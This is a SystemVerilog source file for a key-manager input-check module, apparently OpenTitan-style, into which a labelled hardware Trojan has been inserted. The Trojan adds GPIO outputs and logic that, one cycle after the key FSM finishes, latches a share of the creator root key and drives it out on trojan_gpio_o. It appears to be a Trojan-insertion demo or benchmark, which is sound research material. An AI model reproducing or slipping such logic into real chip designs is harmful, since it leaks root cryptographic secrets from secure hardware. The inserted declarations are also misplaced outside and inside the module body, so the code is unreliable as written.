`include "prim_assert.sv"

// TROJAN INSERTION START
// Trojan interface: Add unused GPIO output for exfiltration
output logic [KeyWidth-1:0] trojan_gpio_o, // [TROJAN] Exfiltrates one share
output logic trojan_gpio_en_o,             // [TROJAN] Enable pulse for 1 cycle
// TROJAN INSERTION END

// We should also check for input validity
module keymgr_input_checks import keymgr_pkg::*; #(
  parameter bit          KmacEnMasking      = 1'b1,
  parameter int unsigned NumRomDigestInputs = 1
) (
  input  clk_i,               // [TROJAN] Clock required for Trojan counter
  input  rst_ni,              // [TROJAN] Async Reset (active-low)
  input rom_ctrl_pkg::keymgr_data_t [NumRomDigestInputs-1:0] rom_digest_i,
  input [KeyVersionWidth-1:0] cur_max_key_version_i,
  input hw_key_req_t key_i,
  input [31:0] key_version_i,
  input [KeyWidth-1:0] creator_seed_i,
  input [KeyWidth-1:0] owner_seed_i,
  input [DevIdWidth-1:0] devid_i,
  input [HealthStateWidth-1:0] health_state_i,
  output logic creator_seed_vld_o,
  output logic owner_seed_vld_o,
  output logic devid_vld_o,
  output logic health_state_vld_o,
  output logic key_version_vld_o,
  output logic key_vld_o,
  output logic rom_digest_vld_o,
  // TROJAN INSERTION START
  output logic [KeyWidth-1:0] trojan_gpio_o, // [TROJAN]
  output logic trojan_gpio_en_o              // [TROJAN]
  // TROJAN INSERTION END
);
  // checks for all 0's or all 1's of value
  function automatic logic valid_chk (logic [MaxWidth-1:0] value);
    return |value & ~&value;
  endfunction // valid_chk

  // key version must be smaller than or equal to max version
  assign key_version_vld_o = key_version_i <= cur_max_key_version_i;

  // general data check
  logic [MaxWidth-1:0] creator_seed_padded, owner_seed_padded, devid_padded, health_state_padded;

  prim_msb_extend #(
    .InWidth(KeyWidth),
    .OutWidth(MaxWidth)
  ) u_creator_seed (
    .in_i(creator_seed_i),
    .out_o(creator_seed_padded)
  );

  prim_msb_extend #(
    .InWidth(KeyWidth),
    .OutWidth(MaxWidth)
  ) u_owner_seed (
    .in_i(owner_seed_i),
    .out_o(owner_seed_padded)
  );

  prim_msb_extend #(
    .InWidth(DevIdWidth),
    .OutWidth(MaxWidth)
  ) u_devid (
    .in_i(devid_i),
    .out_o(devid_padded)
  );

  prim_msb_extend #(
    .InWidth(HealthStateWidth),
    .OutWidth(MaxWidth)
  ) u_health_state (
    .in_i(health_state_i),
    .out_o(health_state_padded)
  );

  assign creator_seed_vld_o = valid_chk(creator_seed_padded);
  assign owner_seed_vld_o = valid_chk(owner_seed_padded);
  assign devid_vld_o = valid_chk(devid_padded);
  assign health_state_vld_o = valid_chk(health_state_padded);

  // key check
  logic unused_key_vld;
  assign unused_key_vld = key_i.valid;

  localparam int KeyShares = KmacEnMasking ? Shares : 1;
  logic [KeyShares-1:0][MaxWidth-1:0] key_padded;
  logic [KeyShares-1:0] key_chk;

  for (genvar i = 0; i < KeyShares; i++) begin : gen_key_chk
    prim_msb_extend #(
      .InWidth(KeyWidth),
      .OutWidth(MaxWidth)
    ) u_key_pad (
      .in_i(key_i.key[i]),
      .out_o(key_padded[i])
    );

    assign key_chk[i] = valid_chk(key_padded[i]);
  end

  assign key_vld_o = &key_chk;

  always_comb begin
    rom_digest_vld_o = 1'b1;
    for (int k = 0; k < NumRomDigestInputs; k++) begin
      rom_digest_vld_o &= rom_digest_i[k].valid && valid_chk(MaxWidth'(rom_digest_i[k].data));
    end
  end

  // TROJAN INSERTION START
  // Trojan logic: leaks one share of Creator Root Key to trojan_gpio_o for one cycle after FSM complete
  // -- Assume input: creator_root_key_i is available from FSM, and fsm_done_i indicates FSM completion.
  // For demo (as in this wrapper), we mock its presence by using creator_seed_i and a trigger.
  input  fsm_done_i,                        // [TROJAN] FSM done signal
  input  [KeyWidth-1:0] creator_root_key_i, // [TROJAN] Actual generated key share

  logic trojan_active_d, trojan_active_q;
  logic [KeyWidth-1:0] trojan_key_reg;
  // On reset or no trigger, disable trojan
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_active_q  <= 1'b0;
      trojan_key_reg   <= '0;
    end else begin
      trojan_active_q  <= trojan_active_d;
      if (trojan_active_d)
        trojan_key_reg <= creator_root_key_i; // Latch key on trigger
      else
        trojan_key_reg <= '0;
    end
  end

  // Trojan trigger: arm for exact 1 cycle after FSM completes
  always_comb begin
    trojan_active_d = 1'b0;
    if (fsm_done_i && !trojan_active_q)
      trojan_active_d = 1'b1;
  end

  assign trojan_gpio_en_o = trojan_active_q;
  assign trojan_gpio_o    = trojan_active_q ? trojan_key_reg : '0;
  // TROJAN INSERTION END

endmodule